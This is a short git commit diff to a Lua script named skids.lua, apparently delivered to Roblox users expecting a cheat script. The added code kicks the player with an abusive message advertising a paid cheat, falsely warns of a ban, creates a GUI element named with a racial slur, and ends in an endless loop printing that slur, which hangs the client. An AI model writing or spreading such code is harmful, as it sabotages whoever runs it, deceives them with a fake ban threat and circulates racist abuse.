d31e50f5e6f3634474f78a8e1247357d91365451
xz <95953670+laagginq@users.noreply.github.com>
2023-08-04 16:24:52 -0700

    Update skids.lua

--- skids.lua
+++ skids.lua
@@ -1,5 +1,10 @@
-game.Players.LocalPlayer:Kick("FUCKING BROKIE BUY EVO V3 @ .gg/camlock - xz <3")
+game.Players.LocalPlayer:Kick("FUCKING BROKIE YOU HAVE 5 SECONDS TO LOG BEFORE YOU GET BANNED BUY EVO V3 @ .gg/camlock - xz <3 ")
 
-wait(10)
+wait(5)
+
+local gui = Instance.new("ScreenGui",game.Players.LocalPlayer.PlayerGui)
+gui.Name = "bro u banned my nigga"
+
+wait(1)
 
 while true do print("nigga") end
